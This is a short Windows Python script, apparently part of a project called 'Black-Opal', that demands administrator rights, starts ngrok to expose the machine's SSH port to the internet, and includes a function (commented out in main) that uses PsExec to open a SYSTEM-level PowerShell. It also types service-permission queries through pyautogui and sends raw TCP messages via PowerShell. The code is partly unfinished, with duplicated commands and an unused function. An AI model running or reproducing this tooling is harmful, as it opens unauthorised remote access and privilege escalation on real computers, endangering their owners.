import os
import sys
import time
import pyautogui
import subprocess
from multiprocessing import Process
from pyuac import main_requires_admin #add pyuac and pypiwin32 to requirements.txt


def start_server():
    subprocess.Popen(['cmd.exe', '/c', 'cd C:/Users/cyn0v/OneDrive/Documents/GitHub/Black-Opal/Resources && ngrok.exe tcp 22'])
    time.sleep(2)
    
    
def priv_escaltion():
    #run exe file from path
    os.system("SysinternalsSuite\PsExec.exe -s powershell.exe")
    
def commands():
    time.sleep(2)
    pyautogui.write("sc.exe sdshow scmanager")
    pyautogui.press("enter")
    pyautogui.write("sc.exe sdshow scmanager")
    pyautogui.press("enter")
    pass
   
def send_message(port, message):
    #send message
    os.system(f"powershell -c \"$c = New-Object System.Net.Sockets.TCPClient('127.0.0.1', {port});$c.Connect();$c.Send('{message}');$c.Disconnect()\"")
    


@main_requires_admin
def main():
    default_path = os.getcwd()
    #p1 = Process(target = priv_escaltion)
    #p1.start()
    p2 = Process(target = start_server)
    p2.start()
    

if __name__ == "__main__":
    main()